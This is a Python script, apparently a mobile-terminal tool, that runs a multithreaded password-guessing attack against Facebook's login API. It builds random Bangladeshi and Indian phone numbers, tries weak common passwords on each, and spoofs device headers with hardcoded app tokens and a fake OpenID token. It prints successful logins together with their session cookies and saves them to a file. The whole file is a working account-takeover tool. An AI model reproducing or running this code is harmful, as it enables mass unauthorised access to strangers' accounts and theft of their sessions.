import os
os.system('clear')
print(' Importing Modules! ....')
try:
	import requests,json,time,re,random,sys,uuid,string,base64,subprocess
	from string import *
	from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
	exit('\n Error in Module!')
#strings = requests.get('https://raw.githubusercontent.com/RDJ-007/files/main/packages/data.txt').text.splitlines()
W = '\033[97;1m';R = '\033[91;1m';G = '\033[92;1m';Y = '\033[93;1m';B = '\033[94;1m';P = '\033[95;1m';S = '\033[96;1m';N = '\x1b[0m';PURPLE ='\x1b[38;5;46m';RED = '\033[1;91m';WHITE = '\033[1;97m';GREEN = '\033[1;32m';YELLOW = '\033[1;33m';BLUE = '\033[1;34m';ORANGE = '\033[1;35m';BLACK="\033[1;37m";EXTRA ='\x1b[38;5;208m';bblack="\033[1;37m";M="\033[1;31m";H="\033[1;33m";byellow="\033[1;33m";bblue="\033[1;34m";P="\033[1;35m";C="\033[1;36m";B="\033[1;37m";G="\033[1;32m";R="\033[1;31m";AA="\033[1;32m";BB="\033[1;31m";CC="\033[1;36m";X='\033[1;30m';XX="\x1b[38;5;196m";LA="\x1b[38;5;10m";LJ="\x1b[38;5;46m";LX="\x1b[1;97m";LG="\x1b[38;5;46m";GGG="\x1b[38;5;214m";TUB="\x1b[1;92m";TU1="\x1b[1;97m";XD="\x1b[1;92m[\x1b[1;97m≖\x1b[1;92m]";SS="\x1b[38;5;223m";my_color = [TUB,TU1];warna = random.choice(my_color)

logo = (f"""
  \x1b[38;5;46m██████ \x1b[38;5;47m ██     \x1b[38;5;48m  █████ \x1b[38;5;49m  ██████\x1b[38;5;86m ██   ██ 
  \x1b[38;5;46m██   ██\x1b[38;5;47m ██     \x1b[38;5;48m ██   ██\x1b[38;5;49m ██     \x1b[38;5;86m ██  ██  
  \x1b[38;5;46m██████ \x1b[38;5;47m ██     \x1b[38;5;48m ███████\x1b[38;5;49m ██     \x1b[38;5;86m █████    
  \x1b[38;5;46m██   ██\x1b[38;5;47m ██     \x1b[38;5;48m ██   ██\x1b[38;5;49m ██     \x1b[38;5;86m ██  ██   
  \x1b[38;5;46m██████ \x1b[38;5;47m ███████\x1b[38;5;48m ██   ██\x1b[38;5;49m  ██████\x1b[38;5;86m ██   ██
{warna}•\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{warna}•
 \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] AUTHOR   : MD MORSHED
 \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] FACEBOOK : MD MORSHED
 \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] GITHUB   : MORSHED-404         \x1b[1;92m[\x1b[1;97m0.8\x1b[1;92m]
{warna}•\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{warna}•""")
def linex():
    print(f'{warna}•\x1b[38;5;223m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{warna}•')
def clear():
    os.system('clear')
    print(logo)
   
def menu():
	clear()
	print(" \x1b[1;92m[\x1b[1;97mA\x1b[1;92m]\x1b[1;92m[\x1b[1;97m1\x1b[1;92m] RANDOM CLONING")
	print(" \x1b[1;92m[\x1b[1;97mB\x1b[1;92m]\x1b[1;92m[\x1b[1;97m2\x1b[1;92m] JOIN GROUP ")
	print(" \x1b[1;92m[\x1b[1;97mC\x1b[1;92m]\x1b[1;92m[\x1b[1;97m3\x1b[1;92m] CONTACT ADMIN")
	print(" \x1b[1;92m[\x1b[1;97mD\x1b[1;92m]\x1b[1;92m[\x1b[1;97m4\x1b[1;92m] WORKING PASS")
	print(" \x1b[1;92m[\x1b[1;97mX\x1b[1;92m]\x1b[1;92m[\x1b[1;97m0\x1b[1;92m] \033[1;31mEXIT")
	linex()
	xd=input(' \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] CHOICE MENU : ')
	if '1' ==xd:
		rnd()
	elif '2' ==xd:
		rnd()
	elif '3' ==xd:
		clear()
		


cps,oks,loop=[],[],0
my_con = []
proxy_allow = []
method_x = []
locl = []

samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X']
def rnd():
	user=[]
	mix_rd=[]
	clear()
	os.system('rm -f /sdcard/ind+bd.txt')
	print(" \x1b[1;92m[\x1b[1;97m1\x1b[1;92m] RANDOM BD CLONE")
	print(" \x1b[1;92m[\x1b[1;97m2\x1b[1;92m] RANDOM INDIA CLONE")
	linex()
	ch = input(' \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] CHOICE MENU : ')
	linex()
	if '2' in ch:
		my_con.append('ind')
		clear()
		print(' \x1b[1;92mPUT CODE : +91955, +91963, +91998, +91623')
		linex()
		code = input(f" \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] ENTER CODE : ")
	elif '1' in ch:
		my_con.append('bd')
		clear()
		print(f" \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] BD SIM CODE : 016 {SS}| {G}017 {SS}| {G}018 {SS}| {G}019 ")
		linex()
		code = input(f" \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] ENTER CODE : ")
	else:
		mix_rd.append('y')
	try:
		if 'y' in mix_rd:
			limit = 1429
		else:
			clear();print(f" {XD} CRACK LIMIT : 2000 {SS}| {G}5000 {SS}| {G}9999");linex()
			limit = int(input(f" {XD} CRACK ID : "))
	except ValueError:
		limit = 5000
	for nmbr in range(limit):
		if 'y' in mix_rd:
			rdx = ['+9195','+9193','+9198','017','018','019','016']
			for i in rdx:
				code = i
				nmp = ''.join(random.choice(string.digits) for _ in range(8))
				user.append(nmp)
				open('/sdcard/ind+bd.txt','a').write(code+nmp+'\n')
		else:
			if "+91" in code:
				nmp = ''.join(random.choice(string.digits) for _ in range(7))
			else:
				nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
	clear()
	print('            \x1b[1;92m  CRACKING SPEED')
	linex()
	print(" \x1b[1;92m[\x1b[1;97m1\x1b[1;92m] FAST")
	print(" \x1b[1;92m[\x1b[1;97m2\x1b[1;92m] NORMAL")
	linex()
	cracking_speed = input(' \x1b[1;92m[\x1b[1;97m≖\x1b[1;92m] CHOICE MENU : ')
	if '2' in cracking_speed:
		spd = 20
	else:
		spd = 30
	with tred(max_workers=spd) as AKING:
		clear()
		total_ids = str(len(user))
		if 'y' in mix_rd:
			print(' total number of cracking: \033[38;5;46m'+total_ids)
			print(' \033[1;33mMix Indian+Bangladesh Started')
		else:
			print(' total number of cracking: \033[38;5;46m'+total_ids+'\033[38;5;46m\n code your selected: '+code)
		print("\033[38;5;46mUse airplane while crack no result \033[1;37m")
		linex()
		if 'y' in mix_rd:
			opn = open('/sdcard/ind+bd.txt','r').read().splitlines()
			for id in opn:
				passlist = ['112244','112200','123412','224455','113322','225566','112255','223355','50607080','77889900','60708090','09876543','00998877']
				ids = id
				AKING.submit(rndm,ids,passlist)
		for psx in user:
			ids = code+psx
			if 'ind' in my_con:
				passlist = ['57273200 57575751','59039200']
			else:
				passlist = ['112244','112200','123412','224455','113322','225566','112255','223355','50607080','77889900','60708090','09876543','00998877',ids,psx]
			AKING.submit(rndm,ids,passlist)
	print('\033[1;37m')
	linex()
	print('\33[0;33m\33[1m The process has completed')
	print('\33[0;33m\33[1m Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
	linex()
	input('\33[0;33m\33[1m Press enter to back \033[1;37m')
	rnd()
def rndm(ids,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\033[1;37m [MATAL-M1] %s|\033[1;32mOK:%s\033[1;36m|\033[1;33mCP:%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
		if '+91' in ids:
			passlist = ['57273200 57575751','59039200']
		for pas in passlist:
			accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
			fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			fbbv = str(random.randint(111111111,999999999))
			fbfw = '1'
			fbrv = '0'
			fban = 'FB4A'
			fbpn = 'com.facebook.katana'
			model = random.choice(strings)
			try:
				ua = open('ua.txt','r').read()
			except:
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			random_seed = random.Random()
			adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
			accessToken = '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
			data = {'adid': adid,
			'format': 'json',
			'device_id': str(uuid.uuid4()).upper(),
			'family_device_id': str(uuid.uuid4()).upper(),
			'secure_family_device_id': str(uuid.uuid4()).upper(),
			'cpl': 'true',
			'try_num': '1',
			'email': ids,
			'password': pas,
			'method': 'auth.login',
			'generate_session_cookies': '1',
			'sim_serials': "['80973453345210784798']",
			'openid_flow': 'android_login',
			'openid_provider': 'google',
			'openid_emails': "['01710940017']",
			'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
			'error_detail_type': 'button_with_disabled',
			'source': 'account_recovery',
			'locale': random.choice(['en_US','en_AU','es_LA','hi_IN']),
			'client_country_code': 'US',
			'fb_api_req_friendly_name': 'authenticate',
			'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
			head={'Host': 'graph.facebook.com',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Accept-Encoding': 'gzip, deflate',
			'Connection': 'keep-alive',
			'Priority': 'u=3, i',
			'X-Fb-Sim-Hni': '45204',
			'X-Fb-Net-Hni': '45201',
			'X-Fb-Connection-Quality': 'GOOD',
			'Zero-Rated': '0',
			'User-Agent':ua,
			'Authorization': 'OAuth '+accessToken,
			'X-Fb-Connection-Bandwidth': '24807555',
			'X-Fb-Connection-Type': 'MOBILE.LTE',
			'X-Fb-Device-Group': '5120',
			'X-Tigon-Is-Retry': 'False',
			'X-Fb-Friendly-Name': 'authenticate',
			'X-Fb-Request-Analytics-Tags': 'unknown',
			'X-Fb-Http-Engine': 'Liger',
			'X-Fb-Client-Ip': 'True',
			'X-Fb-Server-Cluster': 'True',
			'Content-Length': str(len(data))}
			po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
			if "session_key" in str(po):
				uid = str(po['uid'])
				get_coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				compile_coki = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				coki = f"{get_coki};sb={compile_coki}"
				print('\r\r\033[38;5;46m [TC404-OK] '+uid+' | '+pas)
				print('\r\r\033[0;36m Cookies: '+coki+'\033[1;37m')
				oks.append(ids)
				open('/sdcard/TOXIC-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
				break
			elif "www.facebook.com" in po["error"]["message"]:
				cps.append(ids)
				try:
					uid = str(po["error"]["error_data"]["uid"])
				except:
					break
				
				print("\033[1;33m\r\r [TC-404-CP] "+uid+" | "+pas)
				break
		loop+=1
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	except Exception as e:
		print(e)

menu()
